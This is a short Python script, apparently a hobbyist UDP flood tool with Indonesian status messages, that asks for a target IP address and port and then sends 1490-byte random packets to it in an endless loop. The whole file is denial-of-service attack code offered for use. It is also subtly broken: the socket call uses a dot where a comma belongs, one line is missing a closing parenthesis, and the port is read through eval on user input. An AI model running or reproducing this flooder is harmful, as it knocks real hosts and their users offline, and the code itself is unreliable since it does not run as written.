import socket
import random

sock = socket.socket(socket.AF_INET.socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = input ("Enter IP Address: ")
port = eval(input("Enter Port: ")
sent = 0

while True:
    sock.sendto(bytes,(ip,port))
    sent = sent+1
    print("Paket %s menuju ke %s port : %s"%(sent,ip,port))